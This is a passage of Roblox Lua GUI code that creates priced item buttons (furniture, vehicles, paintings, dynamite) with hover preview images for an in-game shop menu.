IcicleWireRed.BackgroundTransparency = 0.6
IcicleWireRed.Position = UDim2.new(0, 5, 0, 509)
IcicleWireRed.Size = UDim2.new(0, 173, 0, 20)
IcicleWireRed.Font = Enum.Font.Fantasy
IcicleWireRed.Text = "Icicle Wire Red (750)"
IcicleWireRed.TextColor3 = Color3.new(1, 1, 1)
IcicleWireRed.TextSize = 14
IcicleWireRed.MouseButton1Down:connect(function()
Item.Text = "IcicleWireRed"
end)

InfoText104 = Instance.new("ImageLabel")
InfoText104.Name = "ImageLabel"
InfoText104.Parent = MainFrame
InfoText104.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText104.BackgroundTransparency = 1
InfoText104.Position = UDim2.new(0, 40, 0, 200)
InfoText104.Size = UDim2.new(0, 100, 0, 100)
InfoText104.Image = "rbxassetid://3709106275"
InfoText104.Visible = false

IcicleWireRed.MouseEnter:connect(function()
InfoText104.Visible = true
end)

IcicleWireRed.MouseLeave:connect(function()
InfoText104.Visible = false
end)

FireworkLauncher = Instance.new("TextButton")
FireworkLauncher.Name = "FireworkLauncher"
FireworkLauncher.Parent = Furniture1
FireworkLauncher.BackgroundColor3 = Color3.new(0, 0, 0)
FireworkLauncher.BorderColor3 = Color3.fromRGB(151, 0, 0)
FireworkLauncher.BackgroundTransparency = 0.6
FireworkLauncher.Position = UDim2.new(0, 5, 0, 533)
FireworkLauncher.Size = UDim2.new(0, 173, 0, 20)
FireworkLauncher.Font = Enum.Font.Fantasy
FireworkLauncher.Text = "Firework Launcher. (7500)"
FireworkLauncher.TextColor3 = Color3.new(1, 1, 1)
FireworkLauncher.TextSize = 14
FireworkLauncher.MouseButton1Down:connect(function()
Item.Text = "FireworkLauncher"
end)

InfoText105 = Instance.new("ImageLabel")
InfoText105.Name = "ImageLabel"
InfoText105.Parent = MainFrame
InfoText105.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText105.BackgroundTransparency = 1
InfoText105.Position = UDim2.new(0, 40, 0, 200)
InfoText105.Size = UDim2.new(0, 100, 0, 100)
InfoText105.Image = "rbxassetid://3836070993"
InfoText105.Visible = false

FireworkLauncher.MouseEnter:connect(function()
InfoText105.Visible = true
end)

FireworkLauncher.MouseLeave:connect(function()
InfoText105.Visible = false
end)

ManyAxe = Instance.new("TextButton")
ManyAxe.Name = "ManyAxe"
ManyAxe.Parent = Furniture1
ManyAxe.BackgroundColor3 = Color3.new(0, 0, 0)
ManyAxe.BorderColor3 = Color3.fromRGB(151, 0, 0)
ManyAxe.BackgroundTransparency = 0.6
ManyAxe.Position = UDim2.new(0, 5, 0, 556)
ManyAxe.Size = UDim2.new(0, 173, 0, 20)
ManyAxe.Font = Enum.Font.Fantasy
ManyAxe.Text = "Many Axe (38004)"
ManyAxe.TextColor3 = Color3.new(1, 1, 1)
ManyAxe.TextSize = 14
ManyAxe.MouseButton1Down:connect(function()
Item.Text = "ManyAxe"
end)

InfoText106 = Instance.new("ImageLabel")
InfoText106.Name = "ImageLabel"
InfoText106.Parent = MainFrame
InfoText106.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText106.BackgroundTransparency = 1
InfoText106.Position = UDim2.new(0, 40, 0, 200)
InfoText106.Size = UDim2.new(0, 100, 0, 100)
InfoText106.Image = "rbxassetid://3836197606"
InfoText106.Visible = false

ManyAxe.MouseEnter:connect(function()
InfoText106.Visible = true
end)

ManyAxe.MouseLeave:connect(function()
InfoText106.Visible = false
end)

CounterTop1Sink = Instance.new("TextButton")
CounterTop1Sink.Name = "CounterTop1Sink"
CounterTop1Sink.Parent = Furniture1
CounterTop1Sink.BackgroundColor3 = Color3.new(0, 0, 0)
CounterTop1Sink.BorderColor3 = Color3.fromRGB(151, 0, 0)
CounterTop1Sink.BackgroundTransparency = 0.6
CounterTop1Sink.Position = UDim2.new(0, 5, 0, 579)
CounterTop1Sink.Size = UDim2.new(0, 173, 0, 20)
CounterTop1Sink.Font = Enum.Font.Fantasy
CounterTop1Sink.Text = "Counter Top Sink (80)"
CounterTop1Sink.TextColor3 = Color3.new(1, 1, 1)
CounterTop1Sink.TextSize = 14
CounterTop1Sink.MouseButton1Down:connect(function()
Item.Text = "CounterTop1Sink"
end)

InfoText107 = Instance.new("ImageLabel")
InfoText107.Name = "ImageLabel"
InfoText107.Parent = MainFrame
InfoText107.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText107.BackgroundTransparency = 1
InfoText107.Position = UDim2.new(0, 40, 0, 200)
InfoText107.Size = UDim2.new(0, 100, 0, 100)
InfoText107.Image = "rbxassetid://3829928313"
InfoText107.Visible = false

CounterTop1Sink.MouseEnter:connect(function()
InfoText107.Visible = true
end)

CounterTop1Sink.MouseLeave:connect(function()
InfoText107.Visible = false
end)

CounterTop1 = Instance.new("TextButton")
CounterTop1.Name = "CounterTop1"
CounterTop1.Parent = Furniture1
CounterTop1.BackgroundColor3 = Color3.new(0, 0, 0)
CounterTop1.BorderColor3 = Color3.fromRGB(151, 0, 0)
CounterTop1.BackgroundTransparency = 0.6
CounterTop1.Position = UDim2.new(0, 5, 0, 602)
CounterTop1.Size = UDim2.new(0, 173, 0, 20)
CounterTop1.Font = Enum.Font.Fantasy
CounterTop1.Text = "Counter Top (80)"
CounterTop1.TextColor3 = Color3.new(1, 1, 1)
CounterTop1.TextSize = 14
CounterTop1.MouseButton1Down:connect(function()
Item.Text = "CounterTop1"
end)


InfoText108 = Instance.new("ImageLabel")
InfoText108.Name = "ImageLabel"
InfoText108.Parent = MainFrame
InfoText108.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText108.BackgroundTransparency = 1
InfoText108.Position = UDim2.new(0, 40, 0, 200)
InfoText108.Size = UDim2.new(0, 100, 0, 100)
InfoText108.Image = "rbxassetid://3829931603"
InfoText108.Visible = false

CounterTop1.MouseEnter:connect(function()
InfoText108.Visible = true
end)

CounterTop1.MouseLeave:connect(function()
InfoText108.Visible = false
end)

CounterTop1Thin = Instance.new("TextButton")
CounterTop1Thin.Name = "CounterTop1Thin"
CounterTop1Thin.Parent = Furniture1
CounterTop1Thin.BackgroundColor3 = Color3.new(0, 0, 0)
CounterTop1Thin.BorderColor3 = Color3.fromRGB(151, 0, 0)
CounterTop1Thin.BackgroundTransparency = 0.6
CounterTop1Thin.Position = UDim2.new(0, 5, 0, 625)
CounterTop1Thin.Size = UDim2.new(0, 173, 0, 20)
CounterTop1Thin.Font = Enum.Font.Fantasy
CounterTop1Thin.Text = "Counter Top Thin (80)"
CounterTop1Thin.TextColor3 = Color3.new(1, 1, 1)
CounterTop1Thin.TextSize = 14
CounterTop1Thin.MouseButton1Down:connect(function()
Item.Text = "CounterTop1Thin"
end)

InfoText109 = Instance.new("ImageLabel")
InfoText109.Name = "ImageLabel"
InfoText109.Parent = MainFrame
InfoText109.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText109.BackgroundTransparency = 1
InfoText109.Position = UDim2.new(0, 40, 0, 200)
InfoText109.Size = UDim2.new(0, 100, 0, 100)
InfoText109.Image = "rbxassetid://3829967141"
InfoText109.Visible = false

CounterTop1Thin.MouseEnter:connect(function()
InfoText109.Visible = true
end)

CounterTop1Thin.MouseLeave:connect(function()
InfoText109.Visible = false
end)

Cabinet1CornerTight = Instance.new("TextButton")
Cabinet1CornerTight.Name = "Cabinet1CornerTight"
Cabinet1CornerTight.Parent = Furniture1
Cabinet1CornerTight.BackgroundColor3 = Color3.new(0, 0, 0)
Cabinet1CornerTight.BorderColor3 = Color3.fromRGB(151, 0, 0)
Cabinet1CornerTight.BackgroundTransparency = 0.6
Cabinet1CornerTight.Position = UDim2.new(0, 5, 0, 648)
Cabinet1CornerTight.Size = UDim2.new(0, 173, 0, 20)
Cabinet1CornerTight.Font = Enum.Font.Fantasy
Cabinet1CornerTight.Text = "Cabinet Corner Tight (80)"
Cabinet1CornerTight.TextColor3 = Color3.new(1, 1, 1)
Cabinet1CornerTight.TextSize = 14
Cabinet1CornerTight.MouseButton1Down:connect(function()
Item.Text = "Cabinet1CornerTight"
end)

InfoText110 = Instance.new("ImageLabel")
InfoText110.Name = "ImageLabel"
InfoText110.Parent = MainFrame
InfoText110.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText110.BackgroundTransparency = 1
InfoText110.Position = UDim2.new(0, 40, 0, 200)
InfoText110.Size = UDim2.new(0, 100, 0, 100)
InfoText110.Image = "rbxassetid://3829936719"
InfoText110.Visible = false

Cabinet1CornerTight.MouseEnter:connect(function()
InfoText110.Visible = true
end)

Cabinet1CornerTight.MouseLeave:connect(function()
InfoText110.Visible = false
end)

Cabinet1CornerWide = Instance.new("TextButton")
Cabinet1CornerWide.Name = "Cabinet1CornerWide"
Cabinet1CornerWide.Parent = Furniture1
Cabinet1CornerWide.BackgroundColor3 = Color3.new(0, 0, 0)
Cabinet1CornerWide.BorderColor3 = Color3.fromRGB(151, 0, 0)
Cabinet1CornerWide.BackgroundTransparency = 0.6
Cabinet1CornerWide.Position = UDim2.new(0, 5, 0, 671)
Cabinet1CornerWide.Size = UDim2.new(0, 173, 0, 20)
Cabinet1CornerWide.Font = Enum.Font.Fantasy
Cabinet1CornerWide.Text = "Cabinet Corner Wide (80)"
Cabinet1CornerWide.TextColor3 = Color3.new(1, 1, 1)
Cabinet1CornerWide.TextSize = 14
Cabinet1CornerWide.MouseButton1Down:connect(function()
Item.Text = "Cabinet1CornerWide"
end)

InfoText111 = Instance.new("ImageLabel")
InfoText111.Name = "ImageLabel"
InfoText111.Parent = MainFrame
InfoText111.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText111.BackgroundTransparency = 1
InfoText111.Position = UDim2.new(0, 40, 0, 200)
InfoText111.Size = UDim2.new(0, 100, 0, 100)
InfoText111.Image = "rbxassetid://3829969744"
InfoText111.Visible = false

Cabinet1CornerWide.MouseEnter:connect(function()
InfoText111.Visible = true
end)

Cabinet1CornerWide.MouseLeave:connect(function()
InfoText111.Visible = false
end)

Cabineta = Instance.new("TextButton")
Cabineta.Name = "Cabinet1"
Cabineta.Parent = Furniture1
Cabineta.BackgroundColor3 = Color3.new(0, 0, 0)
Cabineta.BorderColor3 = Color3.fromRGB(151, 0, 0)
Cabineta.BackgroundTransparency = 0.6
Cabineta.Position = UDim2.new(0, 5, 0, 694)
Cabineta.Size = UDim2.new(0, 173, 0, 20)
Cabineta.Font = Enum.Font.Fantasy
Cabineta.Text = "Cabinet (80)"
Cabineta.TextColor3 = Color3.new(1, 1, 1)
Cabineta.TextSize = 14
Cabineta.MouseButton1Down:connect(function()
Item.Text = "Cabinet1"
end)

InfoText112 = Instance.new("ImageLabel")
InfoText112.Name = "ImageLabel"
InfoText112.Parent = MainFrame
InfoText112.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText112.BackgroundTransparency = 1
InfoText112.Position = UDim2.new(0, 40, 0, 200)
InfoText112.Size = UDim2.new(0, 100, 0, 100)
InfoText112.Image = "rbxassetid://3829939273"
InfoText112.Visible = false

Cabineta.MouseEnter:connect(function()
InfoText112.Visible = true
end)

Cabineta.MouseLeave:connect(function()
InfoText112.Visible = false
end)

Cabinet1Thin = Instance.new("TextButton")
Cabinet1Thin.Name = "Cabinet1Thin"
Cabinet1Thin.Parent = Furniture1
Cabinet1Thin.BackgroundColor3 = Color3.new(0, 0, 0)
Cabinet1Thin.BorderColor3 = Color3.fromRGB(151, 0, 0)
Cabinet1Thin.BackgroundTransparency = 0.6
Cabinet1Thin.Position = UDim2.new(0, 5, 0, 717)
Cabinet1Thin.Size = UDim2.new(0, 173, 0, 20)
Cabinet1Thin.Font = Enum.Font.Fantasy
Cabinet1Thin.Text = "Cabinet Thin (80)"
Cabinet1Thin.TextColor3 = Color3.new(1, 1, 1)
Cabinet1Thin.TextSize = 14
Cabinet1Thin.MouseButton1Down:connect(function()
Item.Text = "Cabinet1Thin"
end)

InfoText113 = Instance.new("ImageLabel")
InfoText113.Name = "ImageLabel"
InfoText113.Parent = MainFrame
InfoText113.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText113.BackgroundTransparency = 1
InfoText113.Position = UDim2.new(0, 40, 0, 200)
InfoText113.Size = UDim2.new(0, 100, 0, 100)
InfoText113.Image = "rbxassetid://3830155691"
InfoText113.Visible = false

Cabinet1Thin.MouseEnter:connect(function()
InfoText113.Visible = true
end)

Cabinet1Thin.MouseLeave:connect(function()
InfoText113.Visible = false
end)

bcps = Instance.new("TextButton")
bcps.Name = "bcps"
bcps.Parent = BuyFrame
bcps.BackgroundColor3 = Color3.new(0, 0, 0)
bcps.BorderColor3 = Color3.new(1, 0, 0)
bcps.BackgroundTransparency = 0.6
bcps.Position =  UDim2.new(0, 3, 0, 49)
bcps.Size = UDim2.new(0, 164, 0, 20)
bcps.Font = Enum.Font.Fantasy
bcps.Text = "Bobs, Car, Pics"
bcps.TextColor3 = Color3.new(1, 1, 1)
bcps.TextSize = 14
bcps.MouseButton1Click:connect(function()
BuyFrame.Visible = true
TimesFrame.Visible = false
  makesound("rbxassetid://156785206")
end)

BobsCarPics = Instance.new("ScrollingFrame")
BobsCarPics.Name = "BobsCarPics"
BobsCarPics.Parent = MenuFrame
BobsCarPics.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
BobsCarPics.BackgroundTransparency = 0.6
BobsCarPics.Position =  UDim2.new(0, 179, 0, 0)
BobsCarPics.BorderColor3 = Color3.new(0, 0, 0)
BobsCarPics.Size = UDim2.new(0, 195, 0, 450)
BobsCarPics.CanvasPosition = Vector2.new(0,0)
BobsCarPics.CanvasSize = UDim2.new(0, 0, 0, 340)
BobsCarPics.Visible = false

Pickup1 = Instance.new("TextButton")
Pickup1.Name = "Pickup1"
Pickup1.Parent = BobsCarPics
Pickup1.BackgroundColor3 = Color3.new(0, 0, 0)
Pickup1.BorderColor3 = Color3.fromRGB(151, 0, 0)
Pickup1.BackgroundTransparency = 0.6
Pickup1.Position = UDim2.new(0, 5, 0, 3)
Pickup1.Size = UDim2.new(0, 173, 0, 20)
Pickup1.Font = Enum.Font.Fantasy
Pickup1.Text = "Pickup1 (19000)"
Pickup1.TextColor3 = Color3.new(1, 1, 1)
Pickup1.TextSize = 14
Pickup1.MouseButton1Down:connect(function()
Item.Text = "Pickup1"
end)

InfoText114 = Instance.new("ImageLabel")
InfoText114.Name = "ImageLabel"
InfoText114.Parent = MainFrame
InfoText114.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText114.BackgroundTransparency = 1
InfoText114.Position = UDim2.new(0, 40, 0, 200)
InfoText114.Size = UDim2.new(0, 100, 0, 100)
InfoText114.Image = "rbxassetid://3704338309"
InfoText114.Visible = false

Pickup1.MouseEnter:connect(function()
InfoText114.Visible = true
end)

Pickup1.MouseLeave:connect(function()
InfoText114.Visible = false
end)

UtilityTruck2 = Instance.new("TextButton")
UtilityTruck2.Name = "UtilityTruck2"
UtilityTruck2.Parent = BobsCarPics
UtilityTruck2.BackgroundColor3 = Color3.new(0, 0, 0)
UtilityTruck2.BorderColor3 = Color3.fromRGB(151, 0, 0)
UtilityTruck2.BackgroundTransparency = 0.6
UtilityTruck2.Position = UDim2.new(0, 5, 0, 26)
UtilityTruck2.Size = UDim2.new(0, 173, 0, 20)
UtilityTruck2.Font = Enum.Font.Fantasy
UtilityTruck2.Text = "Utility Truck 2 (550)"
UtilityTruck2.TextColor3 = Color3.new(1, 1, 1)
UtilityTruck2.TextSize = 14
UtilityTruck2.MouseButton1Down:connect(function()
Item.Text = "UtilityTruck2"
end)

InfoText115 = Instance.new("ImageLabel")
InfoText115.Name = "ImageLabel"
InfoText115.Parent = MainFrame
InfoText115.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText115.BackgroundTransparency = 1
InfoText115.Position = UDim2.new(0, 40, 0, 200)
InfoText115.Size = UDim2.new(0, 100, 0, 100)
InfoText115.Image = "rbxassetid://3704340789"
InfoText115.Visible = false

UtilityTruck2.MouseEnter:connect(function()
InfoText115.Visible = true
end)

UtilityTruck2.MouseLeave:connect(function()
InfoText115.Visible = false
end)

UtilityTruck = Instance.new("TextButton")
UtilityTruck.Name = "UtilityTruck"
UtilityTruck.Parent = BobsCarPics
UtilityTruck.BackgroundColor3 = Color3.new(0, 0, 0)
UtilityTruck.BorderColor3 = Color3.fromRGB(151, 0, 0)
UtilityTruck.BackgroundTransparency = 0.6
UtilityTruck.Position = UDim2.new(0, 5, 0, 49)
UtilityTruck.Size = UDim2.new(0, 173, 0, 20)
UtilityTruck.Font = Enum.Font.Fantasy
UtilityTruck.Text = "Utility Truck (5000)"
UtilityTruck.TextColor3 = Color3.new(1, 1, 1)
UtilityTruck.TextSize = 14
UtilityTruck.MouseButton1Down:connect(function()
Item.Text = "UtilityTruck"
end)

InfoText116 = Instance.new("ImageLabel")
InfoText116.Name = "ImageLabel"
InfoText116.Parent = MainFrame
InfoText116.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText116.BackgroundTransparency = 1
InfoText116.Position = UDim2.new(0, 40, 0, 200)
InfoText116.Size = UDim2.new(0, 100, 0, 100)
InfoText116.Image = "rbxassetid://3704340394"
InfoText116.Visible = false

UtilityTruck.MouseEnter:connect(function()
InfoText116.Visible = true
end)

UtilityTruck.MouseLeave:connect(function()
InfoText116.Visible = false
end)

Trailer2 = Instance.new("TextButton")
Trailer2.Name = "Trailer2"
Trailer2.Parent = BobsCarPics
Trailer2.BackgroundColor3 = Color3.new(0, 0, 0)
Trailer2.BorderColor3 = Color3.fromRGB(151, 0, 0)
Trailer2.BackgroundTransparency = 0.6
Trailer2.Position = UDim2.new(0, 5, 0, 72)
Trailer2.Size = UDim2.new(0, 173, 0, 20)
Trailer2.Font = Enum.Font.Fantasy
Trailer2.Text = "Trailer 2 (13000)"
Trailer2.TextColor3 = Color3.new(1, 1, 1)
Trailer2.TextSize = 14
Trailer2.MouseButton1Down:connect(function()
Item.Text = "Trailer2"
end)

InfoText117 = Instance.new("ImageLabel")
InfoText117.Name = "ImageLabel"
InfoText117.Parent = MainFrame
InfoText117.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText117.BackgroundTransparency = 1
InfoText117.Position = UDim2.new(0, 40, 0, 200)
InfoText117.Size = UDim2.new(0, 100, 0, 100)
InfoText117.Image = "rbxassetid://3704340009"
InfoText117.Visible = false

Trailer2.MouseEnter:connect(function()
InfoText117.Visible = true
end)

Trailer2.MouseLeave:connect(function()
InfoText117.Visible = false
end)

SmallTrailer = Instance.new("TextButton")
SmallTrailer.Name = "SmallTrailer"
SmallTrailer.Parent = BobsCarPics
SmallTrailer.BackgroundColor3 = Color3.new(0, 0, 0)
SmallTrailer.BorderColor3 = Color3.fromRGB(151, 0, 0)
SmallTrailer.BackgroundTransparency = 0.6
SmallTrailer.Position = UDim2.new(0, 5, 0, 95)
SmallTrailer.Size = UDim2.new(0, 173, 0, 20)
SmallTrailer.Font = Enum.Font.Fantasy
SmallTrailer.Text = "Small Trailer (1800)"
SmallTrailer.TextColor3 = Color3.new(1, 1, 1)
SmallTrailer.TextSize = 14
SmallTrailer.MouseButton1Down:connect(function()
Item.Text = "SmallTrailer"
end)

InfoText118 = Instance.new("ImageLabel")
InfoText118.Name = "ImageLabel"
InfoText118.Parent = MainFrame
InfoText118.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText118.BackgroundTransparency = 1
InfoText118.Position = UDim2.new(0, 40, 0, 200)
InfoText118.Size = UDim2.new(0, 100, 0, 100)
InfoText118.Image = "rbxassetid://3709024603"
InfoText118.Visible = false

SmallTrailer.MouseEnter:connect(function()
InfoText118.Visible = true
end)

SmallTrailer.MouseLeave:connect(function()
InfoText118.Visible = false
end)

Painting1 = Instance.new("TextButton")
Painting1.Name = "Painting1"
Painting1.Parent = BobsCarPics
Painting1.BackgroundColor3 = Color3.new(0, 0, 0)
Painting1.BorderColor3 = Color3.fromRGB(151, 0, 0)
Painting1.BackgroundTransparency = 0.6
Painting1.Position = UDim2.new(0, 5, 0, 118)
Painting1.Size = UDim2.new(0, 173, 0, 20)
Painting1.Font = Enum.Font.Fantasy
Painting1.Text = "Unknown (5980)"
Painting1.TextColor3 = Color3.new(1, 1, 1)
Painting1.TextSize = 14
Painting1.MouseButton1Down:connect(function()
Item.Text = "Painting1"
end)

InfoText119 = Instance.new("ImageLabel")
InfoText119.Name = "ImageLabel"
InfoText119.Parent = MainFrame
InfoText119.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText119.BackgroundTransparency = 1
InfoText119.Position = UDim2.new(0, 40, 0, 200)
InfoText119.Size = UDim2.new(0, 100, 0, 100)
InfoText119.Image = "rbxassetid://3704199708"
InfoText119.Visible = false

Painting1.MouseEnter:connect(function()
InfoText119.Visible = true
end)

Painting1.MouseLeave:connect(function()
InfoText119.Visible = false
end)

Painting2 = Instance.new("TextButton")
Painting2.Name = "Painting2"
Painting2.Parent = BobsCarPics
Painting2.BackgroundColor3 = Color3.new(0, 0, 0)
Painting2.BorderColor3 = Color3.fromRGB(151, 0, 0)
Painting2.BackgroundTransparency = 0.6
Painting2.Position = UDim2.new(0, 5, 0, 141)
Painting2.Size = UDim2.new(0, 173, 0, 20)
Painting2.Font = Enum.Font.Fantasy
Painting2.Text = "Disturbed Painting (2006)"
Painting2.TextColor3 = Color3.new(1, 1, 1)
Painting2.TextSize = 14
Painting2.MouseButton1Down:connect(function()
Item.Text = "Painting2"
end)

InfoText120 = Instance.new("ImageLabel")
InfoText120.Name = "ImageLabel"
InfoText120.Parent = MainFrame
InfoText120.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText120.BackgroundTransparency = 1
InfoText120.Position = UDim2.new(0, 40, 0, 200)
InfoText120.Size = UDim2.new(0, 100, 0, 100)
InfoText120.Image = "rbxassetid://3704200080"
InfoText120.Visible = false

Painting2.MouseEnter:connect(function()
InfoText120.Visible = true
end)

Painting2.MouseLeave:connect(function()
InfoText120.Visible = false
end)

Painting3 = Instance.new("TextButton")
Painting3.Name = "Painting3"
Painting3.Parent = BobsCarPics
Painting3.BackgroundColor3 = Color3.new(0, 0, 0)
Painting3.BorderColor3 = Color3.fromRGB(151, 0, 0)
Painting3.BackgroundTransparency = 0.6
Painting3.Position = UDim2.new(0, 5, 0, 164)
Painting3.Size = UDim2.new(0, 173, 0, 20)
Painting3.Font = Enum.Font.Fantasy
Painting3.Text = "Outdoor Watercolor (6)"
Painting3.TextColor3 = Color3.new(1, 1, 1)
Painting3.TextSize = 14
Painting3.MouseButton1Down:connect(function()
Item.Text = "Painting3"
end)

InfoText121 = Instance.new("ImageLabel")
InfoText121.Name = "ImageLabel"
InfoText121.Parent = MainFrame
InfoText121.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText121.BackgroundTransparency = 1
InfoText121.Position = UDim2.new(0, 40, 0, 200)
InfoText121.Size = UDim2.new(0, 100, 0, 100)
InfoText121.Image = "rbxassetid://3704200464"
InfoText121.Visible = false

Painting3.MouseEnter:connect(function()
InfoText121.Visible = true
end)

Painting3.MouseLeave:connect(function()
InfoText121.Visible = false
end)

Painting6 = Instance.new("TextButton")
Painting6.Name = "Painting6"
Painting6.Parent = BobsCarPics
Painting6.BackgroundColor3 = Color3.new(0, 0, 0)
Painting6.BorderColor3 = Color3.fromRGB(151, 0, 0)
Painting6.BackgroundTransparency = 0.6
Painting6.Position = UDim2.new(0, 5, 0, 187)
Painting6.Size = UDim2.new(0, 173, 0, 20)
Painting6.Font = Enum.Font.Fantasy
Painting6.Text = "Gloomy Seascape (16800)"
Painting6.TextColor3 = Color3.new(1, 1, 1)
Painting6.TextSize = 14
Painting6.MouseButton1Down:connect(function()
Item.Text = "Painting6"
end)

InfoText122 = Instance.new("ImageLabel")
InfoText122.Name = "ImageLabel"
InfoText122.Parent = MainFrame
InfoText122.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText122.BackgroundTransparency = 1
InfoText122.Position = UDim2.new(0, 40, 0, 200)
InfoText122.Size = UDim2.new(0, 100, 0, 100)
InfoText122.Image = "rbxassetid://4211436873"
InfoText122.Visible = false

Painting6.MouseEnter:connect(function()
InfoText122.Visible = true
end)

Painting6.MouseLeave:connect(function()
InfoText122.Visible = false
end)

Painting7 = Instance.new("TextButton")
Painting7.Name = "Painting7"
Painting7.Parent = BobsCarPics
Painting7.BackgroundColor3 = Color3.new(0, 0, 0)
Painting7.BorderColor3 = Color3.fromRGB(151, 0, 0)
Painting7.BackgroundTransparency = 0.6
Painting7.Position = UDim2.new(0, 5, 0, 210)
Painting7.Size = UDim2.new(0, 173, 0, 20)
Painting7.Font = Enum.Font.Fantasy
Painting7.Text = "Arctic Light (240600)"
Painting7.TextColor3 = Color3.new(1, 1, 1)
Painting7.TextSize = 14
Painting7.MouseButton1Down:connect(function()
Item.Text = "Painting7"
end)

InfoText123 = Instance.new("ImageLabel")
InfoText123.Name = "ImageLabel"
InfoText123.Parent = MainFrame
InfoText123.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText123.BackgroundTransparency = 1
InfoText123.Position = UDim2.new(0, 40, 0, 200)
InfoText123.Size = UDim2.new(0, 100, 0, 100)
InfoText123.Image = "rbxassetid://4211437680"
InfoText123.Visible = false

Painting7.MouseEnter:connect(function()
InfoText123.Visible = true
end)

Painting7.MouseLeave:connect(function()
InfoText123.Visible = false
end)

Painting8 = Instance.new("TextButton")
Painting8.Name = "Painting8"
Painting8.Parent = BobsCarPics
Painting8.BackgroundColor3 = Color3.new(0, 0, 0)
Painting8.BorderColor3 = Color3.fromRGB(151, 0, 0)
Painting8.BackgroundTransparency = 0.6
Painting8.Position = UDim2.new(0, 5, 0, 233)
Painting8.Size = UDim2.new(0, 173, 0, 20)
Painting8.Font = Enum.Font.Fantasy
Painting8.Text = "Pineapple (240600)"
Painting8.TextColor3 = Color3.new(1, 1, 1)
Painting8.TextSize = 14
Painting8.MouseButton1Down:connect(function()
Item.Text = "Painting8"
end)

InfoText124 = Instance.new("ImageLabel")
InfoText124.Name = "ImageLabel"
InfoText124.Parent = MainFrame
InfoText124.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText124.BackgroundTransparency = 1
InfoText124.Position = UDim2.new(0, 40, 0, 200)
InfoText124.Size = UDim2.new(0, 100, 0, 100)
InfoText124.Image = "rbxassetid://4211438362"
InfoText124.Visible = false

Painting8.MouseEnter:connect(function()
InfoText124.Visible = true
end)

Painting8.MouseLeave:connect(function()
InfoText124.Visible = false
end)

Painting9 = Instance.new("TextButton")
Painting9.Name = "Painting9"
Painting9.Parent = BobsCarPics
Painting9.BackgroundColor3 = Color3.new(0, 0, 0)
Painting9.BorderColor3 = Color3.fromRGB(151, 0, 0)
Painting9.BackgroundTransparency = 0.6
Painting9.Position = UDim2.new(0, 5, 0, 256)
Painting9.Size = UDim2.new(0, 173, 0, 20)
Painting9.Font = Enum.Font.Fantasy
Painting9.Text = "The Lonely Giraffe (26800)"
Painting9.TextColor3 = Color3.new(1, 1, 1)
Painting9.TextSize = 14
Painting9.MouseButton1Down:connect(function()
Item.Text = "Painting9"
end)

InfoText125 = Instance.new("ImageLabel")
InfoText125.Name = "ImageLabel"
InfoText125.Parent = MainFrame
InfoText125.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText125.BackgroundTransparency = 1
InfoText125.Position = UDim2.new(0, 40, 0, 200)
InfoText125.Size = UDim2.new(0, 100, 0, 100)
InfoText125.Image = "rbxassetid://4211438989"
InfoText125.Visible = false

Painting9.MouseEnter:connect(function()
InfoText125.Visible = true
end)

Painting9.MouseLeave:connect(function()
InfoText125.Visible = false
end)

Painting10 = Instance.new("TextButton")
Painting10.Name = "Painting10"
Painting10.Parent = BobsCarPics
Painting10.BackgroundColor3 = Color3.new(0, 0, 0)
Painting10.BorderColor3 = Color3.fromRGB(151, 0, 0)
Painting10.BackgroundTransparency = 0.6
Painting10.Position = UDim2.new(0, 5, 0, 279)
Painting10.Size = UDim2.new(0, 173, 0, 20)
Painting10.Font = Enum.Font.Fantasy
Painting10.Text = "Burnt Painting (26800)"
Painting10.TextColor3 = Color3.new(1, 1, 1)
Painting10.TextSize = 14
Painting10.MouseButton1Down:connect(function()
Item.Text = "Painting10"
end)

InfoText126 = Instance.new("ImageLabel")
InfoText126.Name = "ImageLabel"
InfoText126.Parent = MainFrame
InfoText126.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText126.BackgroundTransparency = 1
InfoText126.Position = UDim2.new(0, 40, 0, 200)
InfoText126.Size = UDim2.new(0, 100, 0, 100)
InfoText126.Image = "rbxassetid://04481885278"
InfoText126.Visible = false

Painting10.MouseEnter:connect(function()
InfoText126.Visible = true
end)

Painting10.MouseLeave:connect(function()
InfoText126.Visible = false
end)

Dynamite = Instance.new("TextButton")
Dynamite.Name = "Dynamite"
Dynamite.Parent = BobsCarPics
Dynamite.BackgroundColor3 = Color3.new(0, 0, 0)
Dynamite.BorderColor3 = Color3.fromRGB(151, 0, 0)
Dynamite.BackgroundTransparency = 0.6
Dynamite.Position = UDim2.new(0, 5, 0, 302)
Dynamite.Size = UDim2.new(0, 173, 0, 20)
Dynamite.Font = Enum.Font.Fantasy
Dynamite.Text = "Dynamite (220)"
Dynamite.TextColor3 = Color3.new(1, 1, 1)
Dynamite.TextSize = 14
Dynamite.MouseButton1Down:connect(function()
Item.Text = "Dynamite"
end)

InfoText127 = Instance.new("ImageLabel")
InfoText127.Name = "ImageLabel"
InfoText127.Parent = MainFrame
InfoText127.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText127.BackgroundTransparency = 1
InfoText127.Position = UDim2.new(0, 40, 0, 200)
InfoText127.Size = UDim2.new(0, 100, 0, 100)
InfoText127.Image = "rbxassetid://3709589876"
InfoText127.Visible = false

Dynamite.MouseEnter:connect(function()
InfoText127.Visible = true
end)

Dynamite.MouseLeave:connect(function()
InfoText127.Visible = false
end)

